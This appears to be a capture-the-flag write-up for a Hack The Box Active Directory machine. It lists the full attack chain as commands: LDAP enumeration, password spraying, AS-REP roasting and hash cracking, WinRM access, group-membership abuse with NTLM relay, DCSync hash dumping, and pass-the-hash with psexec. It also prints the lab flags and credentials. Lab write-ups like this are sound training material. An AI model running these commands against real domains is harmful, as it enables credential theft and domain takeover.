
Initial scan with nmap came out with several results
Command:
```
nmap -sV -Pn -T4 10.10.10.161 -p-
```
Found a ldap service opened on port 389 and decided to to use the command:
```
ldapsearch -H ldap://10.10.10.161 -x -s base '' "(objectClass=*)" "*" +
```
Next we check for a null-bund on the LDAP.

```
ldapsearch -H ldap://10.10.10.161 -x -b DC=htb,DC=local
```
For user enumeration I use the commands:
```
ldapsearch -H ldap://10.10.10.161 -x -b DC=htb,DC=local "(objectClass=person)" | grep "sAMAccountName:"

enum4linux -v 10.10.10.161
```
With this search I was able to find a user svc-alfresco. 
After this we did a kerberos password spray attack with the kerbrute tool.

```
 ./kerbrute passwordspray -d htb.local --dc 10.10.10.161 user.txt 'password123' -v
```
With this attack we were able to find out that the user svc-alfresco did not need pre authentication
After the spray we did a AS-REP Roasting attack on the machine with the GetNPUsers script

```
./GetNPUsers.py htb.local/svc-alfresco -no-pass -dc-ip 10.10.10.161
```
This command gave us a hash which we then used John to crack.

```
john --wordlist=~/rockyou.txt alf.hash
```
We got the password for svc-alfresco:s3rvice.
After gaining the password we used the binary 
Evil-WinRM:
```
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```
With that we gained initial access and found the user flag on the desktop

user flag: 3d6a7c6a450f8c07b30261ca85b42ca0

Privledge Escalation:

We know that Account Operators can add new users so we will attempt to add a new user:

```
net user bigb0ss bigb0ss /add /domain

net group "Exchange Trusted Subsystem" bigb0ss /add /domain
```
we use ntlmrelayx.py to set up a mitm and catch an attempt to login with the new user

```
python3 ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user bigb0ss
```

Then we do a random auth with the account on our local machine which failes on our machine but successfully escalates privledges on the victims machine.
```
python3 psexec.py htb.local/bigb0ss:bigb0ss@10.10.16.7
```
we then use DCSync to dump the hashes with another tool called secretsdump.py 
```
python3 secretsdump.py htb.local/bigb0ss:bigb0ss@10.10.10.161 -just-dc-user administrator
```
Finally we gain root access using PSexec
```
psexec.py htb.local/administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```
root flag: 1345e723085e50f3605e575ad4f41fbe

system has been rooted action is no longer required.
